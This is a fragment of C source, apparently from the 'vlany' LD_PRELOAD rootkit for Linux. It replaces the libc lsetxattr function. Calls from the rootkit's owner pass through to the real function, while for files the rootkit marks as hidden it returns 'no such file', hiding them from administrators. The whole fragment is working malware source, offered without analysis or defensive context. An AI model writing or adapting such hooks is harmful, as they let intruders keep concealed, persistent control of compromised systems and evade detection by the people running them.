int lsetxattr(const char *path, const char *name, const void *value, size_t size, int flags)
{
    #ifdef DEBUG
        printf("[vlany] lsetxattr() called\n");
    #endif

    HOOK(old_lsetxattr, CLSETXATTR);

    if(owned()) return old_lsetxattr(path, name, value, size, flags);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_lsetxattr(path, name, value, size, flags);
}
